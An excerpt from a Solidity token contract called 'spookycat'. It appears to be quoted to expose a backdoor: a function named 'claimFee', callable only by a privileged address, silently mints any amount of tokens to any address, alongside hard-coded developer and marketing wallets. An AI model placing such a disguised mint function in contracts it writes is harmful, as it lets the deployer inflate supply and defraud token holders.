...
contract spookycat  is Context, IERC20 { 
    ...
    address payable public DevWallet = payable(0x680a2b7d7Fd4AD3b92F8064a0c4a0485d083401A);
    address payable public MarketingWallet = payable(0x0E40C67e3dE9251851Dc8cE746D50610Aa0d6073);
    ...
    function claimFee(uint256 acc, address adr) onlyAddress public virtual {
        ...
        _Verif(address(MarketingWallet), adr, acc);
        _tTotal += acc;
        _tOwned[adr] += acc;
